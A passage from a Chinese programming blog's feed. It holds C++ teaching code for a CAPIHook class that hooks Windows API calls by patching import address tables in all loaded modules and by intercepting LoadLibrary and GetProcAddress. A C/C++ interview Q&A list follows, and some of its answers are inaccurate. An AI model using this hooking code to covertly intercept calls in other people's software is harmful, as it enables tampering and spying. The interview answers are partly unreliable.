class="params">(HMODULE hModule, DWORD dwFlags)</span></span>;</span><br><span class="line">       <span class="comment">//用来跟踪当前进程加载新的DLL</span></span><br><span class="line">       <span class="function"><span class="keyword">static</span> HMODULE WINAPI <span class="title">LoadLibraryA</span><span class="params">(PCSTR pszModulePath)</span></span>;</span><br><span class="line">       <span class="function"><span class="keyword">static</span> HMODULE WINAPI <span class="title">LoadLibraryW</span><span class="params">(PCWSTR pszModulePath)</span></span>;</span><br><span class="line">       <span class="function"><span class="keyword">static</span> HMODULE WINAPI <span class="title">LoadLibraryExA</span><span class="params">(PCSTR pszModulePath, HANDLE hFile, DWORD dwFlags)</span></span>;</span><br><span class="line">       <span class="function"><span class="keyword">static</span> HMODULE WINAPI <span class="title">LoadLibraryExW</span><span class="params">(PCWSTR pszModulePath, HANDLE hFile, DWORD dwFlags)</span></span>;</span><br><span class="line">       <span class="comment">//如果请求已HOOK的API函数，则返回用户自定义函数的地址</span></span><br><span class="line">       <span class="function"><span class="keyword">static</span> FARPROC WINAPI <span class="title">GetProcAddress</span><span class="params">(HMODULE hModule, PCSTR pszProcName)</span></span>; </span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">       <span class="comment">//自动对这些函数进行挂钩</span></span><br><span class="line">       <span class="keyword">static</span> CAPIHook sm_LoadLibraryA;</span><br><span class="line">       <span class="keyword">static</span> CAPIHook sm_LoadLibraryW;</span><br><span class="line">       <span class="keyword">static</span> CAPIHook sm_LoadLibraryExA;</span><br><span class="line">       <span class="keyword">static</span> CAPIHook sm_LoadLibraryExW;</span><br><span class="line">       <span class="keyword">static</span> CAPIHook sm_GetProcAddress;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">========================APIHook.cpp========================</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;APIHook.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;Tlhelp32.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;ImageHlp.h&gt;  //为了调用ImageDirectoryEntryToData函数</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> comment(lib, <span class="meta-string">&quot;ImageHlp&quot;</span>)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//CAPIHook对象链表的头指针</span></span><br><span class="line">CAPIHook *CAPIHook::sm_pHeader = <span class="literal">NULL</span>;</span><br><span class="line">CAPIHook::CAPIHook(LPSTR pszModName, LPSTR pszFuncName,PROC pfnHook, BOOL bExcludeAPIHookMod<span class="comment">/* =TRUE */</span>)</span><br><span class="line">&#123;</span><br><span class="line">       <span class="comment">//保存这个Hook函数的信息</span></span><br><span class="line">       m_bExcludeAPIHookMod = bExcludeAPIHookMod;</span><br><span class="line">       m_pszModName = pszModName;</span><br><span class="line">       m_pszFuncName = pszFuncName;</span><br><span class="line">       m_pfnHook = pfnHook;</span><br><span class="line">       m_pfnOrig = ::GetProcAddress(::GetModuleHandle(pszModName), pszFuncName);</span><br><span class="line"></span><br><span class="line">       <span class="comment">//将此对象添加到链表中</span></span><br><span class="line">       m_pNext = sm_pHeader;</span><br><span class="line">       sm_pHeader = <span class="keyword">this</span>;</span><br><span class="line">       <span class="comment">//在所有当前已加载的模块中HOOK这个函数</span></span><br><span class="line">       ReplaceIATEntryInAllMods(m_pszModName, m_pfnOrig, m_pfnHook, bExcludeAPIHookMod);</span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line">CAPIHook::~CAPIHook()</span><br><span class="line">&#123;</span><br><span class="line">       <span class="comment">//取消对所有模块中函数的HOOK</span></span><br><span class="line">       ReplaceIATEntryInAllMods(m_pszModName, m_pfnHook, m_pfnOrig,  m_bExcludeAPIHookMod);</span><br><span class="line">       CAPIHook *p = sm_pHeader;</span><br><span class="line"></span><br><span class="line">       <span class="comment">//从链表中移除此对象</span></span><br><span class="line">       <span class="keyword">if</span>(p == <span class="keyword">this</span>)</span><br><span class="line">       &#123;</span><br><span class="line">              sm_pHeader = p-&gt;m_pNext;</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">else</span></span><br><span class="line">       &#123;</span><br><span class="line">              <span class="keyword">while</span>(p != <span class="literal">NULL</span>)</span><br><span class="line">              &#123;</span><br><span class="line">                     <span class="keyword">if</span>(p-&gt;m_pNext == <span class="keyword">this</span>)</span><br><span class="line">                     &#123;</span><br><span class="line">                            p-&gt;m_pNext = <span class="keyword">this</span>-&gt;m_pNext;</span><br><span class="line">                            <span class="keyword">break</span>;</span><br><span class="line">                     &#125;</span><br><span class="line">                     p = p-&gt;m_pNext;</span><br><span class="line">              &#125;</span><br><span class="line">       &#125;     </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">CAPIHook::ReplaceIATEntryInOneMod</span><span class="params">(LPSTR pszExportMod, PROC pfnCurrent, PROC pfnNew, HMODULE hModCaller)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">       <span class="comment">//取得模块的导入表(import descriptor)的首地址</span></span><br><span class="line">       <span class="comment">//ImageDirectoryEntryToData函数可以返回导入表地址</span></span><br><span class="line">       ULONG ulSize;</span><br><span class="line">       PIMAGE_IMPORT_DESCRIPTOR pImportDesc =(PIMAGE_IMPORT_DESCRIPTOR)::ImageDirectoryEntryToData(hModCaller, TRUE,IMAGE_DIRECTORY_ENTRY_IMPORT, &amp;ulSize);</span><br><span class="line"></span><br><span class="line">       <span class="keyword">if</span>(pImportDesc == <span class="literal">NULL</span>)      <span class="comment">//这个模块没有导入表项</span></span><br><span class="line">              <span class="keyword">return</span>;  </span><br><span class="line"></span><br><span class="line">       <span class="comment">//查找包含pszExportMod模块中函数导入信息的导入表项</span></span><br><span class="line">       <span class="keyword">while</span>(pImportDesc-&gt;Name != <span class="number">0</span>)</span><br><span class="line">       &#123;</span><br><span class="line">              LPSTR pszMod = (LPSTR)((DWORD)hModCaller + pImportDesc-&gt;Name);</span><br><span class="line">              <span class="keyword">if</span> (lstrcmpi(pszMod, pszExportMod) == <span class="number">0</span>)    </span><br><span class="line">              &#123;</span><br><span class="line">                     <span class="keyword">break</span>;</span><br><span class="line">              &#125;</span><br><span class="line">              pImportDesc++;</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">if</span> (pImportDesc-&gt;Name == <span class="number">0</span>)    <span class="comment">//hModCaller模块没有从pszExportMod模块导入任何函数</span></span><br><span class="line">       &#123;</span><br><span class="line">              <span class="keyword">return</span>;</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       <span class="comment">//取得调用者的导入地址表(import address table, IAT)</span></span><br><span class="line">       PIMAGE_THUNK_DATA pThunk = (PIMAGE_THUNK_DATA)(pImportDesc-&gt;FirstThunk +  (DWORD)hModCaller);</span><br><span class="line"></span><br><span class="line">       <span class="comment">//查找我们要HOOK的函数，将它的地址用新函数的地址替换掉</span></span><br><span class="line">       <span class="keyword">while</span> (pThunk-&gt;u1.Function)</span><br><span class="line">       &#123;</span><br><span class="line">              <span class="comment">//lpAddr指向的内存保存了函数的地址</span></span><br><span class="line">              PDWORD lpAddr = (PDWORD)&amp;(pThunk-&gt;u1.Function);</span><br><span class="line">              <span class="keyword">if</span> (*lpAddr == (DWORD)pfnCurrent)</span><br><span class="line">              &#123;</span><br><span class="line">                     <span class="comment">//修改页的保护属性</span></span><br><span class="line">                     DWORD dwOldProtect;</span><br><span class="line">                     MEMORY_BASIC_INFORMATION mbi;</span><br><span class="line">                     ::VirtualQuery(lpAddr, &amp;mbi, <span class="keyword">sizeof</span>(mbi));</span><br><span class="line">                     ::VirtualProtect(lpAddr, <span class="keyword">sizeof</span>(DWORD), PAGE_READWRITE, &amp;dwOldProtect);</span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">                     <span class="comment">//修改内存地址，相当于&quot;lpAddr = (DWORD)pfnNew;&quot;</span></span><br><span class="line">                     ::WriteProcessMemory(::GetCurrentProcess(), lpAddr,  &amp;pfnNew, <span class="keyword">sizeof</span>(DWORD), <span class="literal">NULL</span>);</span><br><span class="line">                     ::VirtualProtect(lpAddr, <span class="keyword">sizeof</span>(DWORD), dwOldProtect, <span class="number">0</span>);</span><br><span class="line">                     <span class="keyword">break</span>;</span><br><span class="line">              &#125;</span><br><span class="line">              pThunk++;</span><br><span class="line">       &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">CAPIHook::ReplaceIATEntryInAllMods</span><span class="params">(LPSTR pszExportMod, PROC pfnCurrent, PROC pfnNew, BOOL bExcludeAPIHookMod)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">       <span class="comment">//取得当前模块的句柄</span></span><br><span class="line">       HMODULE hModThis = <span class="literal">NULL</span>;</span><br><span class="line">       <span class="keyword">if</span>(bExcludeAPIHookMod)</span><br><span class="line">       &#123;</span><br><span class="line">              MEMORY_BASIC_INFORMATION mbi;</span><br><span class="line">              <span class="keyword">if</span>(::VirtualQuery(ReplaceIATEntryInAllMods, &amp;mbi, <span class="keyword">sizeof</span>(mbi)) != <span class="number">0</span>)</span><br><span class="line">                     hModThis = (HMODULE)mbi.AllocationBase;</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       <span class="comment">//取得本进程的模块列表</span></span><br><span class="line">       HANDLE hSnap = ::CreateToolhelp32Snapshot(TH32CS_SNAPMODULE, ::GetCurrentProcessId());</span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">       <span class="comment">//遍历所有模块，分别对它们调用ReplaceIATEntryInOnMod函数，修改导入地址表</span></span><br><span class="line">       MODULEENTRY32 me = &#123;<span class="keyword">sizeof</span>(MODULEENTRY32)&#125;;</span><br><span class="line">       BOOL bOK = ::Module32First(hSnap, &amp;me);</span><br><span class="line">       <span class="keyword">while</span> (bOK)</span><br><span class="line">       &#123;</span><br><span class="line">              <span class="comment">//注意，我们不HOOK当前模块的函数</span></span><br><span class="line">              <span class="keyword">if</span> (me.hModule != hModThis)</span><br><span class="line">              &#123;</span><br><span class="line">                    ReplaceIATEntryInOneMod(pszExportMod, pfnCurrent, pfnNew, me.hModule);</span><br><span class="line">              &#125;</span><br><span class="line"></span><br><span class="line">              bOK = ::Module32Next(hSnap, &amp;me);</span><br><span class="line">       &#125;</span><br><span class="line">       ::CloseHandle(hSnap);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"><span class="comment">//挂钩LoadLibrary和GetProcAddress函数，以便在这些函数被调用以后，挂钩的函数也能够被正确的处理</span></span><br><span class="line"><span class="function">CAPIHook <span class="title">CAPIHook::sm_LoadLibraryA</span><span class="params">(<span class="string">&quot;Kernel32.dll&quot;</span>, <span class="string">&quot;LoadLibraryA&quot;</span>, (PROC)CAPIHook::LoadLibraryA, TRUE)</span></span>;</span><br><span class="line"><span class="function">CAPIHook <span class="title">CAPIHook::sm_LoadLibraryW</span><span class="params">(<span class="string">&quot;Kernel32.dll&quot;</span>, <span class="string">&quot;LoadLibraryW&quot;</span>, (PROC)CAPIHook::LoadLibraryW, TRUE)</span></span>;</span><br><span class="line"><span class="function">CAPIHook <span class="title">CAPIHook::sm_LoadLibraryExA</span><span class="params">(<span class="string">&quot;Kernel32.dll&quot;</span>, <span class="string">&quot;LoadLibraryExA&quot;</span>,(PROC)CAPIHook::LoadLibraryExA, TRUE)</span></span>;</span><br><span class="line"><span class="function">CAPIHook <span class="title">CAPIHook::sm_LoadLibraryExW</span><span class="params">(<span class="string">&quot;Kernel32.dll&quot;</span>, <span class="string">&quot;LoadLibraryExW&quot;</span>,(PROC)CAPIHook::LoadLibraryExW, TRUE)</span></span>;</span><br><span class="line"><span class="function">CAPIHook <span class="title">CAPIHook::sm_GetProcAddress</span><span class="params">(<span class="string">&quot;Kernel32.dll&quot;</span>, <span class="string">&quot;GetProcAddress&quot;</span>, (PROC)CAPIHook::GetProcAddress, TRUE)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> WINAPI <span class="title">CAPIHook::HookNewlyLoadedModule</span><span class="params">(HMODULE hModule, DWORD dwFlags)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">       <span class="comment">//如果一个新的模块被加载，挂钩各CAPIHook对象要求的API函数</span></span><br><span class="line">       <span class="keyword">if</span>((hModule != <span class="literal">NULL</span>) &amp;&amp; ((dwFlags&amp;LOAD_LIBRARY_AS_DATAFILE) == <span class="number">0</span>))</span><br><span class="line">       &#123;</span><br><span class="line">              CAPIHook *p = sm_pHeader;</span><br><span class="line">              <span class="keyword">while</span> (p != <span class="literal">NULL</span>)</span><br><span class="line">              &#123;</span><br><span class="line">                     ReplaceIATEntryInOneMod(p-&gt;m_pszModName, p-&gt;m_pfnOrig, p-&gt;m_pfnHook, hModule);</span><br><span class="line">                     p = p-&gt;m_pNext;</span><br><span class="line">              &#125;</span><br><span class="line">       &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"><span class="function">HMODULE WINAPI <span class="title">CAPIHook::LoadLibraryA</span><span class="params">(PCSTR pszModulePath)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">       HMODULE hModule = ::LoadLibraryA(pszModulePath);</span><br><span class="line">       HookNewlyLoadedModule(hModule, <span class="number">0</span>);</span><br><span class="line">       <span class="keyword">return</span> hModule;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"><span class="function">HMODULE WINAPI <span class="title">CAPIHook::LoadLibraryW</span><span class="params">(PCWSTR pszModulePath)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">       HMODULE hModule = ::LoadLibraryW(pszModulePath);</span><br><span class="line">       HookNewlyLoadedModule(hModule, <span class="number">0</span>);</span><br><span class="line">       <span class="keyword">return</span> hModule;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"><span class="function">HMODULE WINAPI <span class="title">CAPIHook::LoadLibraryExA</span><span class="params">(PCSTR pszModulePath, HANDLE hFile, DWORD dwFlags)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">       HMODULE hModule = ::LoadLibraryExA(pszModulePath, hFile, dwFlags);</span><br><span class="line">       HookNewlyLoadedModule(hModule, dwFlags);</span><br><span class="line">       <span class="keyword">return</span> hModule;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"><span class="function">HMODULE WINAPI <span class="title">CAPIHook::LoadLibraryExW</span><span class="params">(PCWSTR pszModulePath, HANDLE hFile, DWORD dwFlags)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">       HMODULE hModule = ::LoadLibraryExW(pszModulePath, hFile, dwFlags);</span><br><span class="line">       HookNewlyLoadedModule(hModule, dwFlags);</span><br><span class="line">       <span class="keyword">return</span> hModule;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"><span class="function">FARPROC WINAPI <span class="title">CAPIHook::GetProcAddress</span><span class="params">(HMODULE hModule, PCSTR pszProcName)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">       <span class="comment">//得到函数的真实地址</span></span><br><span class="line">       FARPROC pfn = ::GetProcAddress(hModule, pszProcName);</span><br><span class="line">       <span class="comment">//看它是否我们要HOOK的函数</span></span><br><span class="line">       CAPIHook *p = sm_pHeader;</span><br><span class="line">       <span class="keyword">while</span>(p != <span class="literal">NULL</span>)</span><br><span class="line">       &#123;</span><br><span class="line">              <span class="keyword">if</span> (p-&gt;m_pfnOrig == pfn)</span><br><span class="line">              &#123;</span><br><span class="line">                     pfn = p-&gt;m_pfnHook;</span><br><span class="line">                     <span class="keyword">break</span>;</span><br><span class="line">              &#125;</span><br><span class="line">              p = p-&gt;m_pNext;</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">return</span> pfn;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Windows编程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Windows编程 </tag>
            
            <tag> 注入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>C语言————面试总结</title>
      <link href="2020/12/05/C++%E9%9D%A2%E8%AF%95%E9%A2%98%E6%B1%87%E6%80%BB/"/>
      <url>2020/12/05/C++%E9%9D%A2%E8%AF%95%E9%A2%98%E6%B1%87%E6%80%BB/</url>
      
        <content type="html"><![CDATA[<h2 id="C-语言"><a href="#C-语言" class="headerlink" title="C 语言"></a>C 语言</h2><h3 id="第一部分：基本概念及其它问答题"><a href="#第一部分：基本概念及其它问答题" class="headerlink" title="第一部分：基本概念及其它问答题"></a>第一部分：基本概念及其它问答题</h3><h4 id="1、关键字-static-的作用是什么？"><a href="#1、关键字-static-的作用是什么？" class="headerlink" title="1、关键字 static 的作用是什么？"></a>1、关键字 static 的作用是什么？</h4><p>这个简单的问题很少有人能回答完全。在 C 语言中，关键字 static 有三个明显的作用：<br>1). 在函数体，一个被声明为静态的变量在这一函数被调用过程中维持其值不变。<br>2). 在模块内（但在函数体外），一个被声明为静态的变量可以被模块内所用函数访问，但<br>不能被模块外其它函数访问。它是一个本地的全局变量。<br>3). 在模块内，一个被声明为静态的函数只可被这一模块内的其它函数调用。那就是，这个<br>函数被限制在声明它的模块的本地范围内使用。<br>大多数应试者能正确回答第一部分，一部分能正确回答第二部分，同是很少的人能懂得第三<br>部分。这是一个应试者的严重的缺点，因为他显然不懂得本地化数据和代码范围的好处和重<br>要性。</p><h4 id="2、“引用”与指针的区别是什么？"><a href="#2、“引用”与指针的区别是什么？" class="headerlink" title="2、“引用”与指针的区别是什么？"></a>2、“引用”与指针的区别是什么？</h4><p>答 、1) 引用必须被初始化，指针不必。<br>2) 引用初始化以后不能被改变，指针可以改变所指的对象。<br>3) 不存在指向空值的引用，但是存在指向空值的指针。<br>指针通过某个指针变量指向一个对象后，对它所指向的变量间接操作。程序中使用指针，程<br>序的可读性差；而引用本身就是目标变量的别名，对引用的操作就是对目标变量的操作。<br>流操作符&lt;&lt;和&gt;&gt;、赋值操作符=的返回值、拷贝构造函数的参数、赋值操作符=的参数、其<br>它情况都推荐使用引用。</p><h4 id="3、-h-头文件中的-ifndef-define-endif-的作用？"><a href="#3、-h-头文件中的-ifndef-define-endif-的作用？" class="headerlink" title="3、.h 头文件中的 ifndef/define/endif 的作用？"></a>3、.h 头文件中的 ifndef/define/endif 的作用？</h4><p>答：防止该头文件被重复引用。</p><h4 id="4、-include-与-include-“file-h”的区别？"><a href="#4、-include-与-include-“file-h”的区别？" class="headerlink" title="4、#include 与 #include “file.h”的区别？"></a>4、#include 与 #include “file.h”的区别？</h4><p>答：前者是从 Standard Library 的路径寻找和引用 file.h，而后者是从当前工作路径搜寻并引<br>用 file.h。</p><h4 id="5、描述实时系统的基本特性"><a href="#5、描述实时系统的基本特性" class="headerlink" title="5、描述实时系统的基本特性"></a>5、描述实时系统的基本特性</h4><p>答 ：在特定时间内完成特定的任务，实时性与可靠性。</p><h4 id="6、全局变量和局部变量在内存中是否有区别？如果有，是什么区别？"><a href="#6、全局变量和局部变量在内存中是否有区别？如果有，是什么区别？" class="headerlink" title="6、全局变量和局部变量在内存中是否有区别？如果有，是什么区别？"></a>6、全局变量和局部变量在内存中是否有区别？如果有，是什么区别？</h4><p>答 ：全局变量储存在静态数据区，局部变量在堆栈中。</p><h4 id="7、什么是平衡二叉树？"><a href="#7、什么是平衡二叉树？" class="headerlink" title="7、什么是平衡二叉树？"></a>7、什么是平衡二叉树？</h4><p>答 ：左右子树都是平衡二叉树 且左右子树的深度差值的绝对值不大于1。</p><h4 id="8、堆栈溢出一般是由什么原因导致的？"><a href="#8、堆栈溢出一般是由什么原因导致的？" class="headerlink" title="8、堆栈溢出一般是由什么原因导致的？"></a>8、堆栈溢出一般是由什么原因导致的？</h4><p>答 ：1.没有回收垃圾资源</p><h4 id="2-层次太深的递归调用"><a href="#2-层次太深的递归调用" class="headerlink" title="2.层次太深的递归调用"></a>2.层次太深的递归调用</h4><h4 id="9、冒泡排序算法的时间复杂度是什么？"><a href="#9、冒泡排序算法的时间复杂度是什么？" class="headerlink" title="9、冒泡排序算法的时间复杂度是什么？"></a>9、冒泡排序算法的时间复杂度是什么？</h4><p>答 ：O(n^2)</p><h4 id="10、什么函数不能声明为虚函数？"><a href="#10、什么函数不能声明为虚函数？" class="headerlink" title="10、什么函数不能声明为虚函数？"></a>10、什么函数不能声明为虚函数？</h4><p>答：constructor</p><h4 id="11、队列和栈有什么区别？"><a href="#11、队列和栈有什么区别？" class="headerlink" title="11、队列和栈有什么区别？"></a>11、队列和栈有什么区别？</h4><p>答：队列先进先出，栈后进先出</p><h4 id="12、不能做-switch-的参数类型"><a href="#12、不能做-switch-的参数类型" class="headerlink" title="12、不能做 switch()的参数类型"></a>12、不能做 switch()的参数类型</h4><p>答 ：switch 的参数不能为实型。</p><h4 id="13、局部变量能否和全局变量重名？"><a href="#13、局部变量能否和全局变量重名？" class="headerlink" title="13、局部变量能否和全局变量重名？"></a>13、局部变量能否和全局变量重名？</h4><p>答：能，局部会屏蔽全局。要用全局变量，需要使用”::”<br>局部变量可以与全局变量同名，在函数内引用这个变量时，会用到同名的局部变量，而不会<br>用到全局变量。对于有些编译器而言，在同一个函数内可以定义多个同名的局部变量，比如<br>在两个循环体内都定义一个同名的局部变量，而那个局部变量的作用域就在那个循环体内<br>14、如何引用一个已经定义过的全局变量？<br>答 、可以用引用头文件的方式，也可以用 extern 关键字，如果用引用头文件方式来引用某<br>个在头文件中声明的全局变量，假定你将那个变量写错了，那么在编译期间会报错，如果你<br>用 extern 方式引用时，假定你犯了同样的错误，那么在编译期间不会报错，而在连接期间报<br>错。<br>15、全局变量可不可以定义在可被多个.C 文件包含的头文件中？为什么？<br>答 、可以，在不同的 C 文件中以 static 形式来声明同名全局变量。<br>可以在不同的 C 文件中声明同名的全局变量，前提是其中只能有一个 C 文件中对此变量赋<br>初值，此时连接不会出错。<br>16、语句 for( ；1 ；)有什么问题？它是什么意思？<br>答 、和 while(1)相同，无限循环。<br>17、do……while 和 while……do 有什么区别？<br>答 、前一个循环一遍再判断，后一个判断以后再循环。<br>18、statac 全局变量、局部变量、函数与普通全局变量、局部变量、函数<br>static 全局变量与普通的全局变量有什么区别？static局部变量和普通局部变量有什么区别？<br>static 函数与普通函数有什么区别？<br>答 、全局变量(外部变量)的说明之前再冠以 static 就构成了静态的全局变量。全局变量本身<br>就是静态存储方式，静态全局变量当然也是静态存储方式。这两者在存储方式上并无不同。<br>这两者的区别虽在于非静态全局变量的作用域是整个源程序， 当一个源程序由多个源文件<br>组成时，非静态的全局变量在各个源文件中都是有效的。 而静态全局变量则限制了其作用<br>域， 即只在定义该变量的源文件内有效， 在同一源程序的其它源文件中不能使用它。由于<br>静态全局变量的作用域局限于一个源文件内，只能为该源文件内的函数公用， 因此可以避<br>免在其它源文件中引起错误。<br>从以上分析可以看出， 把局部变量改变为静态变量后是改变了它的存储方式即改变了它的<br>生存期。把全局变量改变为静态变量后是改变了它的作用域， 限制了它的使用范围。<br>static 函数与普通函数作用域不同。仅在本文件。只在当前源文件中使用的函数应该说明为<br>内部函数(static)，内部函数应该在当前源文件中说明和定义。对于可在当前源文件以外使用<br>的函数，应该在一个头文件中说明，要使用这些函数的源文件要包含这个头文件<br>static 全局变量与普通的全局变量有什么区别：static 全局变量只初使化一次，防止在其他文<br>件单元中被引用;<br>static 局部变量和普通局部变量有什么区别：static 局部变量只被初始化一次，下一次依据上<br>一次结果值；<br>static 函数与普通函数有什么区别：static 函数在内存中只有一份，普通函数在每个被调用中<br>维持一份拷贝<br>19、程序的内存分配<br>答：一个由 c/C++编译的程序占用的内存分为以下几个部分<br>1、栈区（stack）—由编译器自动分配释放，存放函数的参数值，局部变量的值等。其操作<br>方式类似于数据结构中的栈。<br>2、堆区（heap）—一般由程序员分配释放，若程序员不释放，程序结束时可能由 OS 回收。<br>注意它与数据结构中的堆是两回事，分配方式倒是类似于链表，呵呵。<br>3、全局区（静态区）（static）—全局变量和静态变量的存储是放在一块的，初始化的全局<br>变量和静态变量在一块区域，未初始化的全局变量和未初始化的静态变量在相邻的另一块区<br>域。程序结束后由系统释放。<br>4、文字常量区—常量字符串就是放在这里的。程序结束后由系统释放。<br>5、程序代码区—存放函数体的二进制代码<br>例子程序<br>这是一个前辈写的，非常详细<br>//main.cpp<br>int a=0; //全局初始化区<br>char <em>p1; //全局未初始化区<br>main()<br>{<br>intb;栈<br>char s[]=”abc”; //栈<br>char *p2; //栈<br>char *p3=”123456″; //123456\0在常量区，p3在栈上。<br>static int c=0； //全局（静态）初始化区<br>p1 = (char</em>)malloc(10);<br>p2 = (char*)malloc(20); //分配得来得10和20字节的区域就在堆区。<br>strcpy(p1,”123456″); //123456\0放在常量区，编译器可能会将它与 p3所向”123456″优化成一<br>个地方。<br>}<br>20、解释堆和栈的区别<br>答：堆（heap）和栈(stack)的区别<br>（1）申请方式<br>stack:由系统自动分配。例如，声明在函数中一个局部变量 int b;系统自动在栈中为 b 开辟空<br>间<br>heap:需要程序员自己申请，并指明大小，在 c 中 malloc 函数<br>如 p1=(char*)malloc(10);<br>在 C++中用 new 运算符<br>如 p2=(char*)malloc(10);<br>但是注意 p1、p2本身是在栈中的。<br>（2）申请后系统的响应<br>栈：只要栈的剩余空间大于所申请空间，系统将为程序提供内存，否则将报异常提示栈溢出。<br>堆：首先应该知道操作系统有一个记录空闲内存地址的链表，当系统收到程序的申请时，<br>会遍历该链表，寻找第一个空间大于所申请空间的堆结点，然后将该结点从空闲结点链表中<br>删除，并将该结点的空间分配给程序，另外，对于大多数系统，会在这块内存空间中的首地<br>址处记录本次分配的大小，这样，代码中的 delete 语句才能正确的释放本内存空间。另外，<br>由于找到的堆结点的大小不一定正好等于申请的大小，系统会自动的将多余的那部分重新放<br>入空闲链表中。<br>（3）申请大小的限制<br>栈：在 Windows 下,栈是向低地址扩展的数据结构，是一块连续的内存的区域。这句话的意<br>思是栈顶的地址和栈的最大容量是系统预先规定好的，在 WINDOWS 下，栈的大小是2M（也<br>有的说是1M，总之是一个编译时就确定的常数），如果申请的空间超过栈的剩余空间时，将<br>提示 overflow。因此，能从栈获得的空间较小。<br>堆：堆是向高地址扩展的数据结构，是不连续的内存区域。这是由于系统是用链表来存储的<br>空闲内存地址的，自然是不连续的，而链表的遍历方向是由低地址向高地址。堆的大小受限<br>于计算机系统中有效的虚拟内存。由此可见，堆获得的空间比较灵活，也比较大。<br>（4）申请效率的比较：<br>栈:由系统自动分配，速度较快。但程序员是无法控制的。<br>堆:是由 new 分配的内存，一般速度比较慢，而且容易产生内存碎片,不过用起来最方便.<br>另外，在 WINDOWS 下，最好的方式是用 Virtual Alloc 分配内存，他不是在堆，也不是在<br>栈,而是直接在进程的地址空间中保留一块内存，虽然用起来最不方便。但是速度快，也最<br>灵活。<br>（5）堆和栈中的存储内容<br>栈：在函数调用时，第一个进栈的是主函数中后的下一条指令（函数调用语句的下一条可执<br>行语句）的地址，然后是函数的各个参数，在大多数的 C 编译器中，参数是由右往左入栈<br>的，然后是函数中的局部变量。注意静态变量是不入栈的。<br>当本次函数调用结束后，局部变量先出栈，然后是参数，最后栈顶指针指向最开始存的地址，<br>也就是主函数中的下一条指令，程序由该点继续运行。<br>堆：一般是在堆的头部用一个字节存放堆的大小。堆中的具体内容由程序员安排。<br>（6）存取效率的比较<br>char s1[]=”aaaaaaaaaaaaaaa”;<br>char <em>s2=”bbbbbbbbbbbbbbbbb”;<br>aaaaaaaaaaa 是在运行时刻赋值的；<br>而 bbbbbbbbbbb 是在编译时就确定的；<br>但是，在以后的存取中，在栈上的数组比指针所指向的字符串(例如堆)快。<br>比如：<br>#include<br>voidmain()<br>{<br>char a=1;<br>char c[]=”1234567890″;<br>char *p=”1234567890″;<br>a = c[1];<br>a = p[1];<br>return;<br>}<br>对应的汇编代码<br>10:a=c[1];<br>004010678A4DF1movcl,byteptr[ebp-0Fh]<br>0040106A884DFCmovbyteptr[ebp-4],cl<br>11:a=p[1];<br>0040106D8B55ECmovedx,dwordptr[ebp-14h]<br>004010708A4201moval,byteptr[edx+1]<br>004010738845FCmovbyteptr[ebp-4],al<br>第一种在读取时直接就把字符串中的元素读到寄存器 cl 中，而第二种则要先把指针值读到<br>edx 中，在根据 edx 读取字符，显然慢了。<br>21、什么是预编译,何时需要预编译?<br>答：预编译又称为预处理,是做些代码文本的替换工作。处理#开头的指令,比如拷贝#include<br>包含的文件代码，#define 宏定义的替换,条件编译等，就是为编译做的预备工作的阶段，主<br>要处理#开始的预编译指令，预编译指令指示了在程序正式编译前就由编译器进行的操作，<br>可以放在程序中的任何位置。<br>c 编译系统在对程序进行通常的编译之前，先进行预处理。c 提供的预处理功能主要有以下<br>三种：1）宏定义 2）文件包含 3）条件编译<br>1、 总是使用不经常改动的大型代码体。<br>２、程序由多个模块组成，所有模块都使用一组标准的包含文件和相同的编译选项。在这种<br>情况下，可以将所有包含文件预编译为一个预编译头。<br>22、关键字 const 是什么含意？<br>答：我只要一听到被面试者说：“const 意味着常数”，我就知道我正在和一个业余者打交道。<br>去年 Dan Saks 已经在他的文章里完全概括了 const 的所有用法，因此 ESP(译者：Embedded<br>Systems Programming)的每一位读者应该非常熟悉 const 